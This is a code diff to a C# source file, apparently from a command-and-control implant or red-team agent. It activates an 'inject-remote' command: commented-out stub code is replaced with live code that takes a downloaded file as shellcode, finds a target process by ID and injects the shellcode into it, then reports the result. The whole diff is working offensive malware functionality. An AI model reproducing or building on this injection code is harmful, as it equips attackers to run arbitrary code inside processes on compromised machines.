@@ -15,44 +15,33 @@ namespace Agent.Commands
     {
         public override string Name => "inject-remote";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
-            throw new NotImplementedException();
-            //if (task.SplittedArgs.Length < 1)
-            //{
-            //    result.Result = $"Usage: {this.Name} ProcessId";
-            //    return;
-            //}
+            this.CheckFileDownloaded(task, context);
 
-            //var fileName = task.FileId;
-            //var fileContent = commm.Download(task.FileId, a =>
-            //{
-            //    result.Info = $"Downloading {fileName} ({a}%)";
-            //    commm.SendResult(result);
-            //}).Result;
+            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
+            var fileContent = file.GetFileContent();
 
-            //this.Notify(result, commm, $"{fileName} Downloaded");
+            var shellcode = fileContent;
 
-            //var shellcode = fileContent;
+            int processId = int.Parse(task.SplittedArgs[0]);
 
-            //int processId = int.Parse(task.SplittedArgs[0]);
+            var process = Process.GetProcessById(processId);
+            if (process == null)
+            {
+                context.Result.Result = $"Unable to find process with Id {processId}";
+                return;
+            }
 
-            //var process = Process.GetProcessById(processId);
-            //if(process == null)
-            //{
-            //    result.Result = $"Unable to find process with Id {processId}";
-            //    return;
-            //}
-
-            //var injectRes = Injector.Inject(process, shellcode);
-            //if (!injectRes.Succeed)
-            //    result.Result += $"Injection failed : {injectRes.Error}";
-            //else
-            //{
-            //    result.Result += $"Injection succeed!" + Environment.NewLine;
-            //    if (!string.IsNullOrEmpty(injectRes.Output))
-            //        result.Result += injectRes.Output;
-            //}
+            var injectRes = Injector.Inject(process, shellcode);
+            if (!injectRes.Succeed)
+                context.Result.Result += $"Injection failed : {injectRes.Error}";
+            else
+            {
+                context.Result.Result += $"Injection succeed!" + Environment.NewLine;
+                if (!string.IsNullOrEmpty(injectRes.Output))
+                    context.Result.Result += injectRes.Output;
+            }
         }
     }
 }
